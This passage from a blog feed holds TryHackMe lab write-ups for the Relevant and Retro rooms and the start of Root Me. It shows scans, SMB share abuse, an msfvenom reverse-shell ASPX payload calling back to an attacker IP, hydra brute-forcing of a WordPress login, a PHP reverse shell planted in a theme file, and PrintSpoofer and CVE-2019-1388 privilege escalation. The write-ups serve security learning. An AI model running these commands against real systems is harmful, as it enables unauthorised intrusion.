|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-27T05:21:09+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-26T05:14:40
| Not valid after:  2021-11-25T05:14:40
| MD5:   9663 1f81 95f5 9ab8 6fb0 1d05 4847 e090
|_SHA-1: b94f 8149 8420 d35a c4f2 9bb4 969c b983 6844 bb29
|_ssl-date: 2021-05-27T05:21:48+00:00; +3s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m03s, deviation: 3h07m50s, median: 3s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-26T22:21:10-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-27T05:21:11
|_  start_date: 2021-05-27T05:15:11
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s also run a full, all ports scan.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For ports 49663-49670 we need to run another scan to see exactly what is going on.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
49663/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49664/tcp filtered unknown
49665/tcp filtered unknown
49666/tcp filtered unknown
49667/tcp filtered unknown
49668/tcp open     msrpc   Microsoft Windows RPC
49669/tcp open     msrpc   Microsoft Windows RPC
49670/tcp open     msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sneaky! &lt;code&gt;49663&lt;/code&gt; is our next target, after &lt;code&gt;80&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;12-web-exploration--enumeration&#34;&gt;1.2. Web Exploration + Enumeration&lt;/h3&gt;
&lt;p&gt;On port &lt;code&gt;80&lt;/code&gt;,
&lt;img src=&#34;https://i.imgur.com/BYHbehS.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The gobuster scan results nothing.&lt;/p&gt;
&lt;p&gt;On port &lt;code&gt;49663&lt;/code&gt;,
&lt;img src=&#34;https://i.imgur.com/hX7GsWI.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Same webpage. The gobuster scan again results nothing. Clearly, this is not the path to take.&lt;/p&gt;
&lt;h3 id=&#34;13-smb&#34;&gt;1.3. SMB&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.64.0 -N                               

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The last share looks interesting.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.64.0/nt4wrksv -N
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
                7735807 blocks of size 4096. 4949166 blocks available
smb: \&amp;gt; get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks delicious.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat passwords.txt 
[User Passwords - Encoded]
{hidden}
{hidden}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like base64 encoded. Using psexec, we can check their strength.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 psexec.py &#39;{user1}&#39;:&#39;{pass1}&#39;@10.10.64.0
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.64.0.....
[-] share &#39;ADMIN$&#39; is not writable.
[-] share &#39;C$&#39; is not writable.
[*] Found writable share nt4wrksv
[*] Uploading file bZoikejy.exe
[*] Opening SVCManager on 10.10.64.0.....
[-] Error opening SVCManager on 10.10.64.0.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like user1 is the right username, but the password is wrong. user2 on the other hand,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 psexec.py &#39;{user2}&#39;:&#39;{pass2}&#39;@10.10.64.0
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[-] Authenticated as Guest. Aborting
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-smb--web&#34;&gt;1.4. SMB + Web&lt;/h3&gt;
&lt;p&gt;A common thing to note is that the shares are shared, and can be seen over the web server. Let&amp;rsquo;s try looking for the &lt;code&gt;nt4wrksv&lt;/code&gt; share on both the ports.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/0rM6FuE.png&#34; alt=&#34;A screenshot of Port 80 on the server&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/kIurelS.png&#34; alt=&#34;A screenshot of Port 49663 on the server&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Great! If we can put stuff in smb somehow, we should be solid. Now, the question is, how?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ smbclient //10.10.64.0/nt4wrksv -N
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; put test.txt 
putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/lrXZHbH.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Intersting! Now the question is, what kind of shell does microsoft use for these serivces?&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Exploiting Microsoft IIS with Metasploit&lt;/a&gt; explores in depth.&lt;/p&gt;
&lt;p&gt;We create a payload using &lt;code&gt;msfvenom&lt;/code&gt; and start listening.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.8.184 LPORT=1337 -f asp -o rev.asp  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of asp file: 53168 bytes
Saved as: rev.asp
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Uploading,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.64.0/nt4wrksv -N
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; put rev.asp 
putting file rev.asp as \rev.asp (25.8 kb/s) (average 25.8 kb/s)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and going to the page, we get an error, which redirects us to &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/iis/application-frameworks/running-classic-asp-applications-on-iis-7-and-iis-8/classic-asp-not-installed-by-default-on-iis&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this microsoft link&lt;/a&gt;. This talks about how &lt;code&gt;asp&lt;/code&gt; is not installed by default.&lt;/p&gt;
&lt;p&gt;Looking it up, it looks like we need to get &lt;code&gt;aspx&lt;/code&gt; instead.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s do it again.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.8.184 LPORT=1337 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3416 bytes
Saved as: rev.aspx
                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.64.0/nt4wrksv -N   
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; put rev.aspx
putting file rev.aspx as \rev.aspx (2.7 kb/s) (average 2.7 kb/s)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.64.0] 49897
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;c:\windows\system32\inetsrv&amp;gt;whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv&amp;gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I googled &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; and I soon got to the simple command: &lt;code&gt;PrintSpoofer.exe -i -c cmd&lt;/code&gt;, taken form &lt;a class=&#34;link&#34; href=&#34;https://github.com/dievus/printspoofer&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PrintSpoofer&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we put the file using SMB. Where is the file now, in the machine? We go to &lt;code&gt;C:/Inetpub/wwwroot/&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c:\inetpub\wwwroot\nt4wrksv&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

05/26/2021  11:32 PM    &amp;lt;DIR&amp;gt;          .
05/26/2021  11:32 PM    &amp;lt;DIR&amp;gt;          ..
07/25/2020  08:15 AM                98 passwords.txt
05/26/2021  11:28 PM            27,136 PrintSpoofer.exe
05/26/2021  11:11 PM            53,168 rev.asp
05/26/2021  11:10 PM             3,416 rev.aspx
05/26/2021  10:54 PM                51 test.txt
               5 File(s)         83,869 bytes
               2 Dir(s)  21,113,995,264 bytes free

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Voila!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c:\inetpub\wwwroot\nt4wrksv&amp;gt;PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&amp;gt;whoami
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System Compromised :)&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Retro Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-retro-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-retro-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/Cd3WvVT.png" alt="Featured image of post TryHackMe: Retro Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/retro&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s start with the nmap scan and run gobuster in parallel, since the questions hint on it.&lt;/p&gt;
&lt;p&gt;Looking at the website, it looks like a windows server.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.96.15
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 21:46 EDT
Nmap scan report for 10.10.96.15
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-08T01:47:19+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2021-05-07T01:35:04
|_Not valid after:  2021-11-06T01:35:04
|_ssl-date: 2021-05-08T01:47:23+00:00; +2s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.64 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gobuster returned empty on the dirb common list. One other thing I want to try out is check for subdomains.&lt;/p&gt;
&lt;h3 id=&#34;12-sub-domains&#34;&gt;1.2 Sub-Domains&lt;/h3&gt;
&lt;p&gt;Using the command,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ sudo wfuzz -Z -c -f sub-fighter -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u 10.10.96.15 -H &amp;quot;Host: FUZZ.10.10.96.16&amp;quot; --hc 200,400
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we found out &amp;hellip; nothing. So, anyways, I looked at the hint, and they said &amp;hellip; run it on dirbuster medium list.&lt;/p&gt;
&lt;h3 id=&#34;13-web-enumeration&#34;&gt;1.3 Web Enumeration&lt;/h3&gt;
&lt;p&gt;So I found out one directory named retro. Should have tried it the first thing lmao. Anyways, since they mention &amp;ldquo;the&amp;rdquo; directory, I&amp;rsquo;ll stop the scan and we&amp;rsquo;ll see what it holds for us.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.96.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/07 22:09:35 Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 148] [--&amp;gt; http://10.10.96.15/retro/]
Progress: 13495 / 220561 (6.12%)                                              ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2021/05/07 22:16:22 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Cd3WvVT.png&#34; alt=&#34;A screenshot of the WordPress Website&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Okay. Looking around, we have a login page, which looks like its a cms website. Plus, we see that even the &amp;ldquo;Hello World&amp;rdquo; post in the start (at the bottom) is made by Wade. This means we can try bruteforcing wp-login using hydra. One another path could be uploading a reverse shell, since the first post has a link where we can upload stuff. However, it just redirects to an external website. We can come back to it if hydra does not work out.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/93vX86A.png&#34; alt=&#34;A screenshot of the login page, with Wade given as username&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Okay. Let&amp;rsquo;s fire up burp, and using the intercept option, we have&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /retro/wp-login.php HTTP/1.1

...

log=Wade&amp;amp;pwd=brrr&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=%2Fretro%2Fwp-admin%2F&amp;amp;testcookie=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As the POST request. Also, we are on the right track - look at the error message!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uHZ4R3z.png&#34; alt=&#34;Correct username, showing error on password&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Now we&amp;rsquo;ll do Hydra goes brrr.&lt;/p&gt;
&lt;h3 id=&#34;14-bruteforcing&#34;&gt;1.4 Bruteforcing&lt;/h3&gt;
&lt;p&gt;From &lt;a href=&#34;https://github.com/gnebbia/hydra_notes,&#34;&gt;https://github.com/gnebbia/hydra_notes,&lt;/a&gt; I found the following,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post &amp;lsquo;/wp- login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log In&amp;amp;testcookie=1:S=Location&amp;rsquo;&lt;/p&gt;
&lt;h1 id=&#34;now-we-check-for-success-by-using-slocation-since-cms-uses-a-location&#34;&gt;now we check for success by using S=Location, since cms uses a Location&lt;/h1&gt;
&lt;h1 id=&#34;header-to-redirect-the-user-we-can-think-about-s-as-a-sort-of-grep-applied-to&#34;&gt;header to redirect the user, we can think about S as a sort of grep applied to&lt;/h1&gt;
&lt;h1 id=&#34;the-http-response&#34;&gt;the HTTP response&lt;/h1&gt;
&lt;/blockquote&gt;
&lt;p&gt;Our command thus becomes&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hydra -l Wade -P /usr/share/wordlists/rockyou.txt 10.10.96.15 http-post-form &amp;quot;/retro/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=%2Fretro%2Fwp-admin%2F&amp;amp;testcookie=1:S=Location&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay so meanwhile, I had a look at the hint to see if I am on the right track. The hint mentions the presence of sensitive information. Is it just the username? or maybe, I can look at the posts while hydra attacks.&lt;/p&gt;
&lt;h3 id=&#34;15-web-exploration&#34;&gt;1.5 Web Exploration&lt;/h3&gt;
&lt;p&gt;Oh my god. LMAO.&lt;/p&gt;
&lt;p&gt;Okok so, I was looking around, went to archives, nothing interesting. But, I clicked on Wade and looked at some other things, &amp;ldquo;Entries RSS&amp;rdquo;, &amp;ldquo;Comments RSS&amp;rdquo; looked interesting. So, the Entries was too filled up so I looked at comments first.&lt;/p&gt;
&lt;p&gt;And damn there was something off about the way the sentence is framed. Have a look:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jbF9PDd.png&#34; alt=&#34;A screenshot of the RSS comments section page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Leaving myself a note here just in case I forget how to spell it: {password}&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Now, ofcourse, this could be about ready player one, whose protagonist is this guy - and the story matches too XD&lt;/p&gt;
&lt;p&gt;So, I tried logging in - no harm right, Hydra already running. And then I see this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4ntp2fG.png&#34; alt=&#34;A screenshot of the WordPress Admin page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Ey voila! Stopped Hydra.&lt;/p&gt;
&lt;h3 id=&#34;16-rev-shell-time-or-maybe-not&#34;&gt;1.6 Rev-Shell Time (or maybe not)&lt;/h3&gt;
&lt;p&gt;We have some exploits for cms, in the 404 pages. Go to Appearance -&amp;gt; Theme Editor -&amp;gt; 404.php. We&amp;rsquo;ll put a tasty reverse shell here and then go to an invalid page on the website - thus redirecting us to 404 and we are set.&lt;/p&gt;
&lt;p&gt;Have a netcat listener setup on 1337 or a port of your choice: &lt;code&gt;nc -lvnp 1337&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Goto &lt;code&gt;https://www.revshells.com/&lt;/code&gt; and get the &lt;code&gt;PHP PentestMonkey&lt;/code&gt; code with your ip and port. Now, let&amp;rsquo;s comment out the 404.php WP gave us, and put this code.&lt;/p&gt;
&lt;p&gt;Go to &lt;code&gt;http://10.10.96.15/retro/index.php/yougongetpwned&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to 10.8.150.214:1337 ERROR: Shell process terminated&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Okay. Very interesting. I have never seen this shit before, so I looked it up: &lt;code&gt;https://www.reddit.com/r/oscp/comments/elh0ai/htb_bashed_failed_to_daemonise/&lt;/code&gt; mentions how this may be a firewall issue. One redditor suggests using the port 443, so let&amp;rsquo;s try that.&lt;/p&gt;
&lt;p&gt;&amp;hellip; same error.&lt;/p&gt;
&lt;p&gt;I tried a bunch more common ports, but this wont budge.&lt;/p&gt;
&lt;h2 id=&#34;2-restarting---getting-a-foothold&#34;&gt;2. Restarting - Getting a Foothold&lt;/h2&gt;
&lt;p&gt;Note that we have another port 3389 having ms-wbt-server. Let&amp;rsquo;s try going in using Remmina. We already have credentials.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/fpmQZPT.png&#34; alt=&#34;A screenshot of the Windows Server we logged in using Remmina&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Very nice. User flag in our hands now!&lt;/p&gt;
&lt;p&gt;Doing some exploration we have, &lt;img src=&#34;https://i.imgur.com/O0VfOJT.png&#34; alt=&#34;A screenshot of the Google Chrome new tab page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Notice: the bookmark and the history. It refers to the link: &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2019-1388&#34;&gt;https://nvd.nist.gov/vuln/detail/CVE-2019-1388&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Doing some quick Google and YouTube search, &lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=3BQKpPNlTSo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;I found this YouTube video&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;3-priviledge-escalation&#34;&gt;3. Priviledge Escalation&lt;/h2&gt;
&lt;p&gt;Interestingly, we have another thing hidden here - check the Recycle Bin! The executable required to run this exploit is already present :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/MV8glyU.png&#34; alt=&#34;A screenshot of the Windows Server: Click on &amp;amp;ldquo;Show Details&amp;amp;rdquo;&#34;  /&gt;
Click on &amp;ldquo;Show Details&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Rp9leKG.png&#34; alt=&#34;Click on certificate thing, open with browser&#34;  /&gt;
Click on certificate thing, open with browser&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/fBHEPQN.png&#34; alt=&#34;A screenshot of the Windows Server: Page not displayed&#34;  /&gt;
&amp;ldquo;Page not displayed&amp;rdquo;, this is a valid error since we do not have internet connection.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/7GrrZND.png&#34; alt=&#34;A screenshot of the Windows Server: Save it using ctrl&amp;#43;s&#34;  /&gt;
Save it using ctrl+s, or using the steps shown.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/G0GPvAo.png&#34; alt=&#34;The error message&#34;  /&gt;
If you see the error message, you are on the right track!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ZSvFkZI.png&#34; alt=&#34;Saving the web page&#34;  /&gt;
Save it using the name &lt;em&gt;.&lt;/em&gt; in C:\Windows\System32&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gzjHCUL.png&#34; alt=&#34;CMD as Admin&#34;  /&gt;
🗿📈&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Root Me Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-root-me-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-root-me-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/1xtAlAB.png" alt="Featured image of post TryHackMe: Root Me Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/rrootme&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.35.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 01:18 EDT
Nmap scan report for 10.10.35.149
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.57 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;While go buster and nmap runs, I wanted to see if the website is built on php or not. The following works!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.35.149/index.php&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2 Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.35.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/uploads              (Status: 301) [Size: 314] [--&amp;gt; http://10.10.35.149/uploads/]
/css                  (Status: 301) [Size: 310] [--&amp;gt; http://10.10.35.149/css/]
/js                   (Status: 301) [Size: 309] [--&amp;gt; http://10.10.35.149/js/]
